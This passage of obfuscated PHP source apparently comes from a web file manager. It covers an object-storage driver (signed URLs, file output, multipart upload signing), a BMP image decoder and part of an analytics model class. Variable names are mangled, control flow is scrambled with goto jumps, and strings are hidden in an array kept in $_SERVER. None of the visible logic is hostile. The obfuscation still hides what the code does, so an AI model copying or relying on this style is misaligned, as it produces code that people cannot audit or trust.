(!@is_dir($this->pathFather($EÍ‰™ÑéğÕ)) && !IO::mkdir($this->pathFather($EÍ‰™ÑéğÕ))) { return !1; } $b½§Àƒæè = $this->client->getObject($this->bucket, $a¢Ã‚‡ÖÕ, array(), $EÍ‰™ÑéğÕ); return $b½§Àƒæè !== !1 ? $EÍ‰™ÑéğÕ : !1; } public function link($f»¸”Òğ¯ò, $Bïß°™ Üƒ = array()) { $A‹îñ©İ =& $_SERVER[İåâé¾]; if ($this->signVer == $A‹îñ©İ[199]) { return $this->client->getAuthenticatedURL($this->bucket, $f»¸”Òğ¯ò, 3600 * 12, $Bïß°™ Üƒ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($f»¸”Òğ¯ò, $A‹îñ©İ[8]), 3600 * 12, $this->region, array(), !0, $Bïß°™ Üƒ); } public function fileOut($f–©Ã…İ‚å, $bÇÜ®İİë† = false, $FÎÚĞøÄ×Â = false, $CîÓÎìÈç = '') { goto FãôÄáˆÃ«; b¤ôàñ™ìâ: $f©Áƒ—È» = $this->link($f–©Ã…İ‚å, $eäƒ ‚¬¨ö); $this->fileOutLink($f©Áƒ—È»); goto aÌª´‘£¤; cãÓÜŞø©: if ($aÜ©ƒöÊğ == $FÑÔœê¾´…[200]) { return parent::fileOut($f–©Ã…İ‚å, $bÇÜ®İİë†, $FÎÚĞøÄ×Â, $CîÓÎìÈç); } $bÇÜ®İİë† = $bÇÜ®İİë† ? $FÑÔœê¾´…[201] : $FÑÔœê¾´…[202]; $eäƒ ‚¬¨ö = array($FÑÔœê¾´…[203] => $bÇÜ®İİë† . $FÑÔœê¾´…[204] . rawurlencode($FÎÚĞøÄ×Â), $FÑÔœê¾´…[205] => $aÜ©ƒöÊğ); goto b¤ôàñ™ìâ; FãôÄáˆÃ«: $FÑÔœê¾´… =& $_SERVER[İåâé¾]; if (!$FÎÚĞøÄ×Â) { $FÎÚĞøÄ×Â = $this->pathThis($f–©Ã…İ‚å); } $aÜ©ƒöÊğ = get_file_mime(get_path_ext($FÎÚĞøÄ×Â)); goto cãÓÜŞø©; aÌª´‘£¤: } public function fileOutServer($bßÎÌ–ßğ¾, $CÇÚÄ¨œø = false, $eĞ×´»ƒÁ„ = false, $D½µ¦ÕÛ¿Ï = '') { parent::fileOut($bßÎÌ–ßğ¾, $CÇÚÄ¨œø, $eĞ×´»ƒÁ„, $D½µ¦ÕÛ¿Ï); } public function fileOutImage($aƒ•ÍßŸµÖ, $Bä‰ƒÉ±º = 250) { $aÕ¯Õ¥ùÚ = $this->link($aƒ•ÍßŸµÖ); $this->fileOutLink($aÕ¯Õ¥ùÚ); } public function fileOutImageServer($dÉàõ°†±, $A½ï‰ßÕå = 250) { parent::fileOutImage($dÉàõ°†±, $A½ï‰ßÕå); } public function hashMd5($F¼é‘–©óí, $fÏ›†õÕä = '') { $fÛß¿”‰˜© =& $_SERVER[İåâé¾]; $cïâ‰­È = $this->getObjectInfo($F¼é‘–©óí); if (!$cïâ‰­È) { return !1; } if (!isset($cïâ‰­È[$fÛß¿”‰˜©[206]]) && !empty($fÏ›†õÕä)) { $AôãÌ = $this->copyFile($F¼é‘–©óí, $F¼é‘–©óí, array($fÛß¿”‰˜©[195] => $fÏ›†õÕä)); $cïâ‰­È[$fÛß¿”‰˜©[206]] = $AôãÌ ? $fÏ›†õÕä : $fÛß¿”‰˜©[33]; } return isset($cïâ‰­È[$fÛß¿”‰˜©[206]]) ? $cïâ‰­È[$fÛß¿”‰˜©[206]] : $fÛß¿”‰˜©[33]; } public function fileInfoImage($D–çª•Šé“, &$D‚²…½İæÄ) { $FøÂƒÕîå¦ =& $_SERVER[İåâé¾]; $Dôğù¨ÓÈ = array($FøÂƒÕîå¦[207], $FøÂƒÕîå¦[157], $FøÂƒÕîå¦[208], $FøÂƒÕîå¦[209], $FøÂƒÕîå¦[210]); if (in_array($D‚²…½İæÄ[$FøÂƒÕîå¦[156]], $Dôğù¨ÓÈ)) { $DÖ±ã¦¢‰Ë = $this->link($D–çª•Šé“); $böñŞ…®• = getimagesize($DÖ±ã¦¢‰Ë); if ($böñŞ…®•) { $D‚²…½İæÄ[$FøÂƒÕîå¦[211]] = array($FøÂƒÕîå¦[212] => $böñŞ…®•[0], $FøÂƒÕîå¦[213] => $böñŞ…®•[1]); } } } public function _getObjectInfo($fé÷±Šæèù) { return $this->client->getObjectInfo($this->bucket, $fé÷±Šæèù); } public function uploadFormData($fõ¤Ñâ˜ó¨, $d´­ë¨ˆÀÓ = 3600) { $Aî¯±½Æ©Ø =& $_SERVER[İåâé¾]; $EÌî“ĞÎÉŠ = $this->pathFather($fõ¤Ñâ˜ó¨); $dãñõÖÒŞÌ = $this->client->getHttpUploadPostParams($this->bucket, $EÌî“ĞÎÉŠ, $Aî¯±½Æ©Ø[181], $d´­ë¨ˆÀÓ); return array_merge((array) $dãñõÖÒŞÌ, array($Aî¯±½Æ©Ø[165] => $this->getHost())); } public function multiUploadFormData($FÂëŠºÁ´, $BÕ¢Ë¿Òß¸ = 3600) { $A¥ÛÃ—‡‰ =& $_SERVER[İåâé¾]; $c™æç±Çñ‘ = gmdate($A¥ÛÃ—‡‰[214]); $FË‘”ÎôÙ¢ = array(); $dƒ†”¼Ñ‰Í = $this->client->getUploadId($this->bucket, $FÂëŠºÁ´, $FË‘”ÎôÙ¢); if (!$dƒ†”¼Ñ‰Í) { return !1; } return array($A¥ÛÃ—‡‰[215] => $dƒ†”¼Ñ‰Í, $A¥ÛÃ—‡‰[165] => $this->getHost() . $A¥ÛÃ—‡‰[8] . $this->pathEncode($FÂëŠºÁ´), $A¥ÛÃ—‡‰[216] => $c™æç±Çñ‘, $A¥ÛÃ—‡‰[88] => $FÂëŠºÁ´); } public function multiUploadAuthData($dÈ¡¶®Šš, $A°Ğ×Á“ÉŸ = array()) { goto cßà¸¹¼â®; aùìˆíÌ: if (isset($A°Ğ×Á“ÉŸ[$dœ„ÇÄÊä[221]]) && $A°Ğ×Á“ÉŸ[$dœ„ÇÄÊä[221]] == $dœ„ÇÄÊä[222]) { $Fåîµ—¤èÛ[0] = $dœ„ÇÄÊä[222]; } $A¶Õîï‚²Ë = implode($dœ„ÇÄÊä[223], $Fåîµ—¤èÛ); $D‡Õ‡óÜÛ = base64_encode(hash_hmac($dœ„ÇÄÊä[224], $A¶Õîï‚²Ë, $this->secret, !0)); goto eÖñŠÃƒœ; cßà¸¹¼â®: $dœ„ÇÄÊä =& $_SERVER[İåâé¾]; $D‰‘ËšÂ–Ô = isset($A°Ğ×Á“ÉŸ[$dœ„ÇÄÊä[216]]) ? $A°Ğ×Á“ÉŸ[$dœ„ÇÄÊä[216]] : gmdate($dœ„ÇÄÊä[214]); $A°Ğ×Á“ÉŸ[$dœ„ÇÄÊä[216]] = $D‰‘ËšÂ–Ô; goto B¹Óò·‰‚Œ; A©â²»Á¦ë: if (isset($A°Ğ×Á“ÉŸ[$dœ„ÇÄÊä[217]])) { return $this->listUploadParts($DóÉ–ØåÀ­, $A°Ğ×Á“ÉŸ); } $Fåîµ—¤èÛ = array($dœ„ÇÄÊä[218], $dœ„ÇÄÊä[33], $dœ„ÇÄÊä[114], $dœ„ÇÄÊä[33], "\170\x2d\141\x6d\172\55\144\x61\x74\x65\x3a{$D‰‘ËšÂ–Ô}", $dœ„ÇÄÊä[8] . $this->bucket . $dœ„ÇÄÊä[8] . $this->pathEncode($DóÉ–ØåÀ­) . $BÅùÃôàŒç); if (strpos($BÅùÃôàŒç, $dœ„ÇÄÊä[219]) === 0) { $Fåîµ—¤èÛ[0] = $dœ„ÇÄÊä[220]; } goto aùìˆíÌ; eÖñŠÃƒœ: $a× Û•Àï = $dœ„ÇÄÊä[225] . $this->accessKey . $dœ„ÇÄÊä[4] . $D‡Õ‡óÜÛ; if (strpos($BÅùÃôàŒç, $dœ„ÇÄÊä[219]) === 0) { return array($dœ„ÇÄÊä[226] => $a× Û•Àï, $dœ„ÇÄÊä[216] => $D‰‘ËšÂ–Ô); } return $a× Û•Àï; goto e¦Í‰ù‹µœ; B¹Óò·‰‚Œ: $BÅùÃôàŒç = isset($A°Ğ×Á“ÉŸ[$dœ„ÇÄÊä[156]]) ? $A°Ğ×Á“ÉŸ[$dœ„ÇÄÊä[156]] : $dœ„ÇÄÊä[33]; $DóÉ–ØåÀ­ = $A°Ğ×Á“ÉŸ[$dœ„ÇÄÊä[88]]; unset($A°Ğ×Á“ÉŸ[$dœ„ÇÄÊä[88]]); goto A©â²»Á¦ë; e¦Í‰ù‹µœ: } public function listUploadParts($b·½å‹…©¿, $AÆˆÀ¿¹¶ä = array()) { goto e‡´•çƒİ·; e‡´•çƒİ·: $AŒÒ£‚£Øä =& $_SERVER[İåâé¾]; $cŠ®‘ ÉĞ = str_replace($AŒÒ£‚£Øä[227], $AŒÒ£‚£Øä[33], $AÆˆÀ¿¹¶ä[$AŒÒ£‚£Øä[156]]); $aÅÏ³Ò¶ê = $this->client->listParts($this->bucket, $b·½å‹…©¿, $cŠ®‘ ÉĞ); goto C’Ü×âŒ½; cˆš¥©Ş•: $dÕßîì¯„Ø = $this->multiUploadAuthData($b·½å‹…©¿, $AÆˆÀ¿¹¶ä); if (empty($dÕßîì¯„Ø)) { return !1; } return array($AŒÒ£‚£Øä[226] => $dÕßîì¯„Ø, $AŒÒ£‚£Øä[216] => $AÆˆÀ¿¹¶ä[$AŒÒ£‚£Øä[216]], $AŒÒ£‚£Øä[228] => $aÅÏ³Ò¶ê); goto FŠÑ­µÈÚ ; C’Ü×âŒ½: if (!$aÅÏ³Ò¶ê) { return !1; } unset($AÆˆÀ¿¹¶ä[$AŒÒ£‚£Øä[217]], $AÆˆÀ¿¹¶ä[$AŒÒ£‚£Øä[221]]); $AÆˆÀ¿¹¶ä[$AŒÒ£‚£Øä[88]] = $b·½å‹…©¿; goto cˆš¥©Ş•; FŠÑ­µÈÚ : } public function getHost() { return parent::getHost() . $_SERVER[İåâé¾][8] . $this->bucket; } } goto FØ×Šò‘‘¨; b¿•Æ’’˜: class ZipStream { } class imageGdBMP { public static function load($fÃÅ†Ë‘‡´) { $BáÇ —×¯ = fopen($fÃÅ†Ë‘‡´, $_SERVER[İåâé¾][1158]); if ($BáÇ —×¯ === !1) { return !1; } $BÑß‹©¬ñ = self::loadFromStream($BáÇ —×¯); fclose($BáÇ —×¯); return $BÑß‹©¬ñ; } public static function loadFromStream($B ¿Ä°õˆ¥) { $ağ÷ì¢×­ =& $_SERVER[İåâé¾]; $b˜‰ïÏÙš„ = fread($B ¿Ä°õˆ¥, 14); if ($b˜‰ïÏÙš„ === !1) { return !1; } if ($b˜‰ïÏÙš„[0] != $ağ÷ì¢×­[1435] || $b˜‰ïÏÙš„[1] != $ağ÷ì¢×­[1436]) { return !1; } $CˆóÊ½ÍÍ = unpack($ağ÷ì¢×­[1437] . $ağ÷ì¢×­[1438] . $ağ÷ì¢×­[1439] . $ağ÷ì¢×­[1440] . $ağ÷ì¢×­[1441], $b˜‰ïÏÙš„); return self::loadFromStreamAndFileHeader($B ¿Ä°õˆ¥, $CˆóÊ½ÍÍ); } public static function loadFromStreamAndFileHeader($E¹½îäÂ©Ü, array $F‚ÃÑë•¯) { goto D×‰…ÂĞæí; aÃ ¨†Œ‰¢: if ($DƒÑ¦µ¨– === !1) { return !1; } list(, $b­šæ‡ÛİÜ) = unpack($AÖğÇÒ«¶±[1442], $DƒÑ¦µ¨–); if ($b­šæ‡ÛİÜ == 12) { goto EæßÜØŒìã; B¥îëâ­´: $EóŒóÂŸ²â = 255; goto BŠ¾×÷â; EæßÜØŒìã: $DƒÑ¦µ¨– = fread($E¹½îäÂ©Ü, $b­šæ‡ÛİÜ - 4); if ($DƒÑ¦µ¨– === !1) { return !1; } extract(unpack($AÖğÇÒ«¶±[1443] . $AÖğÇÒ«¶±[1444] . $AÖğÇÒ«¶±[1445] . $AÖğÇÒ«¶±[1446], $DƒÑ¦µ¨–)); goto fï˜‹¶ˆÕ‡; fï˜‹¶ˆÕ‡: $DŒÃ½š°÷å = $F§¨†É‘ì˜ = $DÌ‹»ºµŒ¢ = $E¯÷İ‚Íª­ = 0; $Bª¬ÁÎİÉ = 16711680; $f«Š¡³“Ëã = 65280; goto B¥îëâ­´; BŠ¾×÷â: } else { if (124 < $b­šæ‡ÛİÜ || $b­šæ‡ÛİÜ < 40) { return !1; } else { goto FŸÙÃ¯ÊÇö; A»ˆÓÀŒš: if ($f’÷”„¾ Ï & 2147483648) { $f’÷”„¾ Ï = -(~$f’÷”„¾ Ï & 4294967295) - 1; } if ($F‚ÃÑë•¯[$AÖğÇÒ«¶±[391]] != 0) { $dœµ‘î»°À = $bñ‹Î–»ìš == 1 || $bñ‹Î–»ìš == 4 || $bñ‹Î–»ìš == 8 ? ($DŒÃ½š°÷å ? $DŒÃ½š°÷å : pow(2, $bñ‹Î–»ìš)) << 2 : 0; $a—÷òÍèÀ´ = $A÷æà£èÛø ? $A÷æà£èÛø : ($CˆĞŸ†ãØ× * $bñ‹Î–»ìš + 31 >> 3 & ~3) * abs($f˜¤ƒÂ´); $cÓ»Šİ«ê = $F‚ÃÑë•¯[$AÖğÇÒ«¶±[391]] - $a—÷òÍèÀ´ - $dœµ‘î»°À - 14; if ($b­šæ‡ÛİÜ < $cÓ»Šİ«ê && 40 <= $b­šæ‡ÛİÜ && $b­šæ‡ÛİÜ <= 124) { $b­šæ‡ÛİÜ = $cÓ»Šİ«ê; } } if ($b­šæ‡ÛİÜ - 40 > 0) { $DƒÑ¦µ¨– = fread($E¹½îäÂ©Ü, $b­šæ‡ÛİÜ - 40); if ($DƒÑ¦µ¨– === !1) { return !1; } extract(unpack($AÖğÇÒ«¶±[1456] . $AÖğÇÒ«¶±[1457] . $AÖğÇÒ«¶±[1458] . $AÖğÇÒ«¶±[1459], $DƒÑ¦µ¨– . str_repeat($AÖğÇÒ«¶±[1460], 120))); } else { $DÌ‹»ºµŒ¢ = $Bª¬ÁÎİÉ = $f«Š¡³“Ëã = $EóŒóÂŸ²â = 0; } goto AÁËêÁÀÃË; FŸÙÃ¯ÊÇö: $DƒÑ¦µ¨– = fread($E¹½îäÂ©Ü, 36); if ($DƒÑ¦µ¨– === !1) { return !1; } extract(unpack($AÖğÇÒ«¶±[1447] . $AÖğÇÒ«¶±[1448] . $AÖğÇÒ«¶±[1445] . $AÖğÇÒ«¶±[1449] . $AÖğÇÒ«¶±[1450] . $AÖğÇÒ«¶±[1451] . $AÖğÇÒ«¶±[1452] . $AÖğÇÒ«¶±[1453] . $AÖğÇÒ«¶±[1454] . $AÖğÇÒ«¶±[1455], $DƒÑ¦µ¨–)); goto dËÜéÜ¡å; AÁËêÁÀÃË: if (($bñ‹Î–»ìš == 16 || $bñ‹Î–»ìš == 24 || $bñ‹Î–»ìš == 32) && $E¯÷İ‚Íª­ == 0 && $Bª¬ÁÎİÉ == 0 && $f«Š¡³“Ëã == 0 && $EóŒóÂŸ²â == 0) { switch ($bñ‹Î–»ìš) { case 16: $Bª¬ÁÎİÉ = 31744; $f«Š¡³“Ëã = 992; $EóŒóÂŸ²â = 31; break; case 24: case 32: $Bª¬ÁÎİÉ = 16711680; $f«Š¡³“Ëã = 65280; $EóŒóÂŸ²â = 255; break; } } goto F°‡”ç‰…; dËÜéÜ¡å: if ($CˆĞŸ†ãØ× & 2147483648) { $CˆĞŸ†ãØ× = -(~$CˆĞŸ†ãØ× & 4294967295) - 1; } if ($f˜¤ƒÂ´ & 2147483648) { $f˜¤ƒÂ´ = -(~$f˜¤ƒÂ´ & 4294967295) - 1; } if ($BŠ·ø¦‚˜× & 2147483648) { $BŠ·ø¦‚˜× = -(~$BŠ·ø¦‚˜× & 4294967295) - 1; } goto A»ˆÓÀŒš; F°‡”ç‰…: } } goto Cï¡’“²™²; Eê„ñÒ²ƒÏ: $E†èÕ„à = abs($f˜¤ƒÂ´); $fõ¢õš¤Ê = $f˜¤ƒÂ´ > 0 ? $E†èÕ„à - 1 : 0; $C«ß©›§Ü  = $f˜¤ƒÂ´ > 0 ? -1 : 1; goto d£êË„š«¦; Cï¡’“²™²: if ($CˆĞŸ†ãØ× == 0 || $f˜¤ƒÂ´ == 0 || $d…Óê›…»º != 1 || ($DÌ‹»ºµŒ¢ & $Bª¬ÁÎİÉ) != 0 || ($DÌ‹»ºµŒ¢ & $f«Š¡³“Ëã) != 0 || ($DÌ‹»ºµŒ¢ & $EóŒóÂŸ²â) != 0 || ($Bª¬ÁÎİÉ & $f«Š¡³“Ëã) != 0 || ($Bª¬ÁÎİÉ & $EóŒóÂŸ²â) != 0 || ($f«Š¡³“Ëã & $EóŒóÂŸ²â) != 0) { return !1; } if ($E¯÷İ‚Íª­ == 4 || $E¯÷İ‚Íª­ == 5) { $DƒÑ¦µ¨– = stream_get_contents($E¹½îäÂ©Ü, $A÷æà£èÛø); if ($DƒÑ¦µ¨– === !1) { return !1; } return imagecreatefromstring($DƒÑ¦µ¨–); } $eÈˆêÈ¢ÚÇ = $CˆĞŸ†ãØ× * $bñ‹Î–»ìš + 31 >> 3 & ~3; goto Eê„ñÒ²ƒÏ; D×‰…ÂĞæí: $AÖğÇÒ«¶± =& $_SERVER[İåâé¾]; if ($F‚ÃÑë•¯[$AÖğÇÒ«¶±[810]] != 19778) { return !1; } $DƒÑ¦µ¨– = fread($E¹½îäÂ©Ü, 4); goto aÃ ¨†Œ‰¢; d£êË„š«¦: if ($bñ‹Î–»ìš == 1 || $bñ‹Î–»ìš == 4 || $bñ‹Î–»ìš == 8) { goto eÜ ÈŸ“µğ; BÉÉˆ‚“³: $bÍ¤±À¼ŸÇ = array(); for ($b‚—ôä‚À = 0; $b‚—ôä‚À < $cƒãóô³¬; ++$b‚—ôä‚À) { $DƒÑ¦µ¨– = fread($E¹½îäÂ©Ü, $B÷Ø¯ö¢¤â); if ($DƒÑ¦µ¨– === !1) { imagedestroy($A¥Ø‡ç¯ë§); return !1; } extract(unpack($AÖğÇÒ«¶±[1461], $DƒÑ¦µ¨– . $AÖğÇÒ«¶±[1460])); $bÍ¤±À¼ŸÇ[] = imagecolorallocate($A¥Ø‡ç¯ë§, $eë”ÂŸïÒ›, $C½ƒîö»¬, $Eãì±ø®ƒ); } $C¤¹Ÿ“’¯Æ = 8 - $bñ‹Î–»ìš; goto EéÏæ¬ãÎ¬; EéÏæ¬ãÎ¬: $CªˆºÜ¬ = (1 << $bñ‹Î–»ìš) - 1 << $C¤¹Ÿ“’¯Æ; if ($E¯÷İ‚Íª­ == 1 || $E¯÷İ‚Íª­ == 2) { $cÌ˜äª½á = 0; $dĞ°îéŸâÓ = $bñ‹Î–»ìš >> 2 & 1; for (;;) { if ($cÌ˜äª½á < -1 || $cÌ˜äª½á > $CˆĞŸ†ãØ× || $fõ¢õš¤Ê < -1 || $fõ¢õš¤Ê > $f˜¤ƒÂ´) { imagedestroy($A¥Ø‡ç¯ë§); return !1; } $DƒÑ¦µ¨– = fread($E¹½îäÂ©Ü, 1); if ($DƒÑ¦µ¨– === !1) { imagedestroy($A¥Ø‡ç¯ë§); return !1; } switch ($DƒÑ¦µ¨–) { case $AÖğÇÒ«¶±[1460]: $DƒÑ¦µ¨– = fread($E¹½îäÂ©Ü, 1); if ($DƒÑ¦µ¨– === !1) { imagedestroy($A¥Ø‡ç¯ë§); return !1; } switch ($DƒÑ¦µ¨–) { case $AÖğÇÒ«¶±[1460]: $fõ¢õš¤Ê += $C«ß©›§Ü ; $cÌ˜äª½á = 0; break; case $AÖğÇÒ«¶±[1462]: $fõ¢õš¤Ê = 0; $cÌ˜äª½á = 0; break 3; case $AÖğÇÒ«¶±[1463]: $DƒÑ¦µ¨– = fread($E¹½îäÂ©Ü, 2); if ($DƒÑ¦µ¨– === !1) { imagedestroy($A¥Ø‡ç¯ë§); return !1; } list(, $dÈİƒ•å», $Fß‰éÕƒ’÷) = unpack($AÖğÇÒ«¶±[1464], $DƒÑ¦µ¨–); $cÌ˜äª½á += $dÈİƒ•å»; $fõ¢õš¤Ê += $Fß‰éÕƒ’÷ * $C«ß©›§Ü ; break; default: list(, $AÄ×”…ã°) = unpack($AÖğÇÒ«¶±[1465], $DƒÑ¦µ¨–); $aÒ­ò¸ŸÑÀ = ($AÄ×”…ã° >> $dĞ°îéŸâÓ) + ($AÄ×”…ã° & $dĞ°îéŸâÓ); $DƒÑ¦µ¨– = fread($E¹½îäÂ©Ü, $aÒ­ò¸ŸÑÀ + 1 & ~1); if ($DƒÑ¦µ¨– === !1) { imagedestroy($A¥Ø‡ç¯ë§); return !1; } for ($b‚—ôä‚À = 0, $AçğÔ’½ğÂ = 0; $b‚—ôä‚À < $AÄ×”…ã°; ++$b‚—ôä‚À, ++$cÌ˜äª½á, $AçğÔ’½ğÂ += $bñ‹Î–»ìš) { list(, $bÄ—ï¸ ÇÄ) = unpack($AÖğÇÒ«¶±[1465], $DƒÑ¦µ¨–[$AçğÔ’½ğÂ >> 3]); $Eãì±ø®ƒ = $AçğÔ’½ğÂ & 7; imagesetpixel($A¥Ø‡ç¯ë§, $cÌ˜äª½á, $fõ¢õš¤Ê, $bÍ¤±À¼ŸÇ[($bÄ—ï¸ ÇÄ & $CªˆºÜ¬ >> $Eãì±ø®ƒ) >> $C¤¹Ÿ“’¯Æ - $Eãì±ø®ƒ]); } break; } break; default: $AãØ‘¾Š½Ö = fread($E¹½îäÂ©Ü, 1); if ($AãØ‘¾Š½Ö === !1) { imagedestroy($A¥Ø‡ç¯ë§); return !1; } list(, $AÁ¤–âİºÎ, $bÄ—ï¸ ÇÄ) = unpack($AÖğÇÒ«¶±[1464], $DƒÑ¦µ¨– . $AãØ‘¾Š½Ö); for ($b‚—ôä‚À = 0, $AçğÔ’½ğÂ = 0; $b‚—ôä‚À < $AÁ¤–âİºÎ; ++$b‚—ôä‚À, ++$cÌ˜äª½á, $AçğÔ’½ğÂ += $bñ‹Î–»ìš) { $Eãì±ø®ƒ = $AçğÔ’½ğÂ & 7; imagesetpixel($A¥Ø‡ç¯ë§, $cÌ˜äª½á, $fõ¢õš¤Ê, $bÍ¤±À¼ŸÇ[($bÄ—ï¸ ÇÄ & $CªˆºÜ¬ >> $Eãì±ø®ƒ) >> $C¤¹Ÿ“’¯Æ - $Eãì±ø®ƒ]); } break; } } } else { for ($Fˆ²†´È»• = 0; $Fˆ²†´È»• < $E†èÕ„à; ++$Fˆ²†´È»•, $fõ¢õš¤Ê += $C«ß©›§Ü ) { $DƒÑ¦µ¨– = fread($E¹½îäÂ©Ü, $eÈˆêÈ¢ÚÇ); if ($DƒÑ¦µ¨– === !1) { imagedestroy($A¥Ø‡ç¯ë§); return !1; } $AçğÔ’½ğÂ = 0; for ($cÌ˜äª½á = 0; $cÌ˜äª½á < $CˆĞŸ†ãØ×; ++$cÌ˜äª½á, $AçğÔ’½ğÂ += $bñ‹Î–»ìš) { list(, $bÄ—ï¸ ÇÄ) = unpack($AÖğÇÒ«¶±[1465], $DƒÑ¦µ¨–[$AçğÔ’½ğÂ >> 3]); $Eãì±ø®ƒ = $AçğÔ’½ğÂ & 7; imagesetpixel($A¥Ø‡ç¯ë§, $cÌ˜äª½á, $fõ¢õš¤Ê, $bÍ¤±À¼ŸÇ[($bÄ—ï¸ ÇÄ & $CªˆºÜ¬ >> $Eãì±ø®ƒ) >> $C¤¹Ÿ“’¯Æ - $Eãì±ø®ƒ]); } } } goto BÔÏ×ˆèİ; eÜ ÈŸ“µğ: $A¥Ø‡ç¯ë§ = imagecreate($CˆĞŸ†ãØ×, $E†èÕ„à); $B÷Ø¯ö¢¤â = $b­šæ‡ÛİÜ == 12 ? 3 : 4; $cƒãóô³¬ = $DŒÃ½š°÷å ? $DŒÃ½š°÷å : pow(2, $bñ‹Î–»ìš); goto BÉÉˆ‚“³; BÔÏ×ˆèİ: } else { goto FŒ Û¦ïâõ; AÙ¨ßÕ›æ: $føé²Ì•¡ğ = $Bª¬ÁÎİÉ ? 1 / $Bª¬ÁÎİÉ : 1; $FÓë¦°•ò‡ = $f«Š¡³“Ëã ? 1 / $f«Š¡³“Ëã : 1; $BŞ¯˜‡ôÄ = $EóŒóÂŸ²â ? 1 / $EóŒóÂŸ²â : 1; goto fßçáÖ·’; aÏö‘ƒ˜„ñ: $c¾ô­Ù•Åµ = $bñ‹Î–»ìš >> 3; $c‹ ±ØÕÌÑ = $DÌ‹»ºµŒ¢ ? 127 : 0; $c÷ĞŸÁ¼ = $DÌ‹»ºµŒ¢ ? 1 / $DÌ‹»ºµŒ¢ : 1; goto AÙ¨ßÕ›æ; fßçáÖ·’: for ($Fˆ²†´È»• = 0; $Fˆ²†´È»• < $E†èÕ„à; ++$Fˆ²†´È»•, $fõ¢õš¤Ê += $C«ß©›§Ü ) { $DƒÑ¦µ¨– = fread($E¹½îäÂ©Ü, $eÈˆêÈ¢ÚÇ); if ($DƒÑ¦µ¨– === !1) { imagedestroy($A¥Ø‡ç¯ë§); return !1; } $AçğÔ’½ğÂ = 0; for ($cÌ˜äª½á = 0; $cÌ˜äª½á < $CˆĞŸ†ãØ×; ++$cÌ˜äª½á, $AçğÔ’½ğÂ += $c¾ô­Ù•Åµ) { list(, $bÄ—ï¸ ÇÄ) = unpack($AÖğÇÒ«¶±[1442], substr($DƒÑ¦µ¨–, $AçğÔ’½ğÂ, $c¾ô­Ù•Åµ) . $AÖğÇÒ«¶±[1466]); $eš‹ºÂàù‰ = $bÄ—ï¸ ÇÄ & $DÌ‹»ºµŒ¢; $c¨©Î Õİ = $bÄ—ï¸ ÇÄ & $Bª¬ÁÎİÉ; $C¡Öê’ğ‰Ú = $bÄ—ï¸ ÇÄ & $f«Š¡³“Ëã; $c˜‰œÙ¼ó¶ = $bÄ—ï¸ ÇÄ & $EóŒóÂŸ²â; $DØ©¬§Âï˜ = $c‹ ±ØÕÌÑ - (($eš‹ºÂàù‰ << 7) - $eš‹ºÂàù‰) * $c÷ĞŸÁ¼; $eë”ÂŸïÒ› = (($c¨©Î Õİ << 8) - $c¨©Î Õİ) * $føé²Ì•¡ğ; $C½ƒîö»¬ = (($C¡Öê’ğ‰Ú << 8) - $C¡Öê’ğ‰Ú) * $FÓë¦°•ò‡; $Eãì±ø®ƒ = (($c˜‰œÙ¼ó¶ << 8) - $c˜‰œÙ¼ó¶) * $BŞ¯˜‡ôÄ; imagesetpixel($A¥Ø‡ç¯ë§, $cÌ˜äª½á, $fõ¢õš¤Ê, $DØ©¬§Âï˜ << 24 | $eë”ÂŸïÒ› << 16 | $C½ƒîö»¬ << 8 | $Eãì±ø®ƒ); } } imagealphablending($A¥Ø‡ç¯ë§, !0); goto c¦›†‰ŒÇó; FŒ Û¦ïâõ: $A¥Ø‡ç¯ë§ = imagecreatetruecolor($CˆĞŸ†ãØ×, $E†èÕ„à); imagealphablending($A¥Ø‡ç¯ë§, !1); if ($DÌ‹»ºµŒ¢) { imagesavealpha($A¥Ø‡ç¯ë§, !0); } goto aÏö‘ƒ˜„ñ; c¦›†‰ŒÇó: } return $A¥Ø‡ç¯ë§; goto c…ŸÑŞ²ß‡; c…ŸÑŞ²ß‡: } } class AnalysisModel extends ModelBaseLight { public function init($eå‘ĞÇ) { $b¼¥¾‹ˆï =& $_SERVER[İåâé¾]; $eË¤‚İÖ’Ç = array($b¼¥¾‹ˆï[416] => array($b¼¥¾‹ˆï[29] => $b¼¥¾‹ˆï[1467], $b¼¥¾‹ˆï[264] => array($b¼¥¾‹ˆï[216], $b¼¥¾‹ˆï[457], $b¼¥¾‹ˆï[1468], $b¼¥¾‹ˆï[1469])), $b¼¥¾‹ˆï[1470] => array($b¼¥¾‹ˆï[29] => $b¼¥¾‹ˆï[1471], $b¼¥¾‹ˆï[264] => array($b¼¥¾‹ˆï[216], $b¼¥¾‹ˆï[455], $b¼¥¾‹ˆï[1472], $b¼¥¾‹ˆï[1473], $b¼¥¾‹ˆï[1474]))); if (!isset($eË¤‚İÖ’Ç[$eå‘ĞÇ])) { return !1; } $this->optionType = $eË¤‚İÖ’Ç[$eå‘ĞÇ][$b¼¥¾‹ˆï[29]]; $this->field = $eË¤‚İÖ’Ç[$eå‘ĞÇ][$b¼¥¾‹ˆï[264]]; return !0; } public function listData($CáÆ÷áŒÙ = false, $DùôÂÆ’£æ = "\155\157\x64\x69\146\171\x54\x69\x6d\x65", $F‰„õ®Ìˆ = false) { return parent::listData($CáÆ÷áŒÙ, $DùôÂÆ’£æ, $F‰„õ®Ìˆ); } public function trendList($D¿Ø®©íÄù) { goto e½«„ÓƒŞ; e›ìç¼é…‘: foreach ($F†À›ßâ as $dèÎ•Îó’) { $this->{$c®ô‘ëçö‹}($dèÎ•Îó’); } return $this->listData(); goto CÓìŠ¾¿­‚; e½«„ÓƒŞ: $e™†ëˆ½„ =& $_SERVER[İåâé¾]; $EÌ˜ŞçÄ¬Å = $this->listData(); if ($EÌ˜ŞçÄ¬Å) { $B‰ç¥±È… = end($EÌ˜ŞçÄ¬Å); $dèÎ•Îó’ = date($e™†ëˆ½„[1475], strtotime($e™†ëˆ½„[1476])); if ($B‰ç¥±È…[$e™†ëˆ½„[216]] == $dèÎ•Îó’) { return $EÌ˜ŞçÄ¬Å; } $F£ó‡Ò± = strtotime($B‰ç¥±È…[$e™†ëˆ½„[216]]); } goto eŠÌÊ¼ÆÊµ; eŠÌÊ¼ÆÊµ: if (!isset($F£ó‡Ò±)) { $DèÆÜÆ÷ = $D¿Ø®©íÄù == $e™†ëˆ½„[416] ? $e™†ëˆ½„[1477] : $e™†ëˆ½„[521]; $F£ó‡Ò± = Model($DèÆÜÆ÷)->min($e™†ëˆ½„[186]); } $c®ô‘ëçö‹ = $e™†ëˆ½„[1478] . ucfirst($D¿Ø®©íÄù); $F†À›ßâ = $this->dateList($F£ó‡Ò±); goto 